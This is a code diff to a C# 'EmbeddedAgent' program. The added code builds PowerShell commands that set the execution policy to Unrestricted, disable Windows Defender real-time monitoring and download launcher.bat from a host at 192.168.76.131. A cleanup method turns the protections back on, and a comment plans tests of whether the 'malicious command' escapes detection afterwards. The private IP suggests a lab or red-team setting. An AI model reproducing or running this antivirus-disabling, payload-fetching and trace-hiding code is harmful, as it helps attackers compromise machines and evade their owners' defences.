@@ -49,13 +49,36 @@ namespace EmbeddedAgent
             List<string> commands = new List<string>();
 
             commands.Add($"cd $env:tmp");
+            commands.Add("Set-ExecutionPolicy Unrestricted");
+            commands.Add("Set-MpPreference -DisableRealtimeMonitoring $true");
 
             if (!CheckIfLauncherIsAlreadyInstalled())
                 commands.Add("Invoke-WebRequest http://192.168.76.131/launcher.bat -OutFile launcher.bat");
 
-            commands.Add(".\\launcher.bat");
+            return commands;
+
+        }
+        /*
+         * TODO test cases
+         * 
+         * First Test case:
+         * I execute the malicious command and then wait a moment and then i run the cleanup command (I will try to see if the command gets detected,even after it has bee run)
+         * If nothing happens and it doesnt get detected then i'm good
+         * 
+         * Second case:
+         * Will have to think about it, if the first cas gets detected
+         * 
+         */
+        public static List<string> CleanUpCommands()
+        {
+
+            List<string> commands = new List<string>();
+
+            commands.Add("Set-ExecutionPolicy Restricted");
+            commands.Add("Set-MpPreference -DisableRealtimeMonitoring $false");
 
             return commands;
+
         }
     }
 }
